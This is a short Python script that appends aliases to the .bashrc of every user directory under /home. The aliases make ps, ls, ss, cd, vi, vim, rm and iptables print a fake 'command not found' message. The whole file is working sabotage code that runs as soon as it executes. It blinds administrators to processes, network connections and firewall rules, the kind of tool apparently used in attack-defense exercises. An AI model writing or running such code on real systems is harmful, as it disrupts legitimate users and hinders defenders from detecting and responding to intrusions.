import os



def edit_bashrc():
    os.chdir("/home")
    for file in os.listdir("."):
        if os.path.isdir(file):
            f = open(file + "/.bashrc", "a")
            f.write('alias ps="echo ps: command not found"\n')
            f.write('alias ls="echo ls: command not found"\n')
            f.write('alias ss="echo ss: command not found"\n')
            f.write('alias cd="echo cd: command not found"\n')
            f.write('alias vi="echo vi: command not found"\n')
            f.write('alias rm="echo rm: command not found"\n')
            f.write('alias vim="echo vim: command not found"\n')
            f.write('alias iptables="echo iptables: command not found"\n')
            f.close()


edit_bashrc()